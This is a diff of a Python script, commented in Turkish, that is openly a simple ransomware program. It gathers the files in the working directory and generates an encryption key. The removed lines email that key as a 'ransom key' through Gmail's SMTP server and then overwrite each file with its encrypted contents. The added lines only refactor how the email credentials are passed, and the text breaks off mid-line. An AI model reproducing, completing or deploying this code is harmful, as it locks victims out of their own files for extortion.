@@ -2,16 +2,11 @@ import os
 import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
 from cryptography.fernet import Fernet
 
-def send_email(subject, body, to_address, attachment_data=None):
-    from_address = 'your_email@gmail.com'  # Kendi e-posta adresinizi girin
-    password = 'your_email_password'  # E-posta şifrenizi girin
-
+def send_email(subject, body, to_address, username, password, attachment_data=None):
     msg = MIMEMultipart()
-    msg['From'] = from_address
+    msg['From'] = username
     msg['To'] = to_address
     msg['Subject'] = subject
 
@@ -28,8 +23,8 @@ def send_email(subject, body, to_address, attachment_data=None):
 
     with smtplib.SMTP('smtp.gmail.com', 587) as server:
         server.starttls()
-        server.login(from_address, password)
-        server.sendmail(from_address, to_address, msg.as_string())
+        server.login(username, password)
+        server.sendmail(username, to_address, msg.as_string())
 
 # Dosya isimlerini toplamak için kullanılan kodu buraya ekleyin
 files = []
@@ -42,13 +37,6 @@ for file in os.listdir():
 # Anahtarı oluştur
 key = Fernet.generate_key()
 
-# Anahtarı e-posta ile gönder
-send_email(subject='Fidye Anahtarı', body='Fidye anahtarı bulunmaktadır.', to_address='your_email@gmail.com', attachment_data=key)
-
-# Dosyaları şifrele
-for file in files:
-    with open(file, "rb") as the_file:
-        contents = the_file.read()
-    contents_encrypted = Fernet(key).encrypt(contents)
-    with open(file, "wb") as the_file:
-        the_file.write(contents_encrypted)
+# Gmail hesabınızın kullanıcı adı ve şifresi
+gmail_username = 'your_email@gmail.com'
+gmail_password = 'your_email_pass
